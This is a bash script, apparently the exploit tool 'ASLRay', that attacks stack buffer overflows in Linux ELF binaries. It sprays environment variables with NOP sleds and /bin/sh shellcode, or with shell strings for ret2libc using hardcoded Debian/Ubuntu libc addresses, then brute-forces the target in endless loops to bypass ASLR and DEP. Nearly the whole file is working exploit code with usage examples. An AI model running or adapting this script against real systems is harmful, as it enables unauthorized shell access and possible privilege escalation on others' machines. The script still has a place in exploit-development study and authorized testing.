#!/bin/bash

FILE=$1
BUFFER=$2
SC=$3

# red offensive style
echo -e "\033[01;31m"
echo "
                                  :::::::'
                   ':::::::       :::::'
                     ':::::       :::'
                       ':::       :'
                         ':     _TT_
                         _TT_  /____\\
            _____ _     /____\\ |    |_____ 
     /\\    / ____| |    |    _TT_   |  __ \\
    /  \\  | (___ | |    |   /____\\  | |__) |__ _ _   _ 
   / /\\ \\  \\___ \\| |    |   |    |  |  _  // _\` | | | |
  / ____ \\ ____) | |____|   |    |  | | \\ \\ (_| | |_| |
 /_/    \\_\\_____/|______|   |    |  |_|  \\_\__,_|\\__, |
                        |   |    |  |             __/ |
                        |   |    |__|            |___/
                        |___|    |
                            |    |
                            |____|
"
echo 'Linux ELF x32/x64 ASLR DEP bypass exploit with stack-spraying'
echo -e "\e[0m"

# check for architecture and buffer size
if [ "$FILE" != "" ] && [ "$BUFFER" != "" ]
then
	if [[ "$FILE" != *"/"* ]]
	then
		FILE=./$FILE
# for local execution
	fi
	x86=$(file $FILE | grep '32-bit')
	if [[ "$x86" ]]
	then
		echo 'ELF IS 32-BIT'
# check if DEP/NX enabled
		if [[ `readelf -l $FILE | grep RWE` ]]
		then
			echo 'STACK EXECUTABLE'
			echo 'SPRAYING NOPSLED AND SHELLCODE...'
			if [[ "$SC" != "" ]]
			then
				SC=$(echo $SC | sed s/x/\\\\x/g)
				export SHELLCODE=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne $SC)
			else
				export SHELLCODE=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
			fi
			echo 'EXPLOITING...'
			$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')
			while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x80\x80\xfc\xff') ; done
		else
			echo 'DEP/NX DETECTED'
			echo 'SPRAYING SHELL...'
# for/while wont work for with \n so Ill have to write it manually
       	                export shell0=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell1=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell2=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell3=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell4=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell5=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell6=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell7=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell8=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
       	                export shell9=$(for i in {1..9999}; do echo -ne '/bin/sh\n';done)
			echo 'EXPLOITING... may take a while, if stuck then retry'
			sleep 3
# the libC address is OS specific
			TYPE=/etc/os-release
			if [[ `grep jessie $TYPE` ]]
			then
        	        	while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\xe0\x83\x58\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
# TODO use 'timeout 1 $FILE' in order not to stuck, but how to spawn a shell?
			elif [[ `grep stretch $TYPE` ]]
			then
        	        	while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x40\xe8\x62\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
			elif [[ `grep Xenial $TYPE` ]]
			then
        	        	while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x40\xe9\x63\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
			elif [[ `grep Trusty $TYPE` ]]
			then
        	        	while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -n 'zzzz')$(echo -ne '\x70\xce\x56\xf7')$(echo -n 'XXXX')$(echo -ne '\x80\x80\x80\xff') ; done
			else
				echo 'NOT DEBIAN OR UBUNTU!!!'
				exit 2
			fi
		fi
		echo 'IF NO SHELL - RETRY'
	else
		echo 'ELF IS 64-BIT'
		echo 'SPRAYING NOPSLED AND SHELLCODE...'
		if [[ "$SC" != "" ]]
		then
			SC=$(echo $SC | sed s/x/\\\\x/g)
			for n in {1..10} ; do export SHELLCODE$n=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne $SC); done
		else
			for n in {1..10} ; do export SHELLCODE$n=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'); done
		fi
		echo 'EXPLOITING... may take a while'
		while true ; do $FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyyyyyy')$(echo -ne '\x80\x80\x80\x80\xfc\x7f') ; done
	fi
else
        echo 'Usage : source ASLRay.sh $ELF_BINARY $BUFFER_SIZE [$YOUR_SHELLCODE]'
#	`source` is needed to pass environment variables to TTY
        echo 'Example : source ./ASLRay.sh binary 128'
        echo 'Example : source ./ASLRay.sh binary 128 \x31\x80...'
        echo 'To check STK : scanelf -e binary | grep RWX || readelf -l binary | grep RWE'
	exit 1
fi
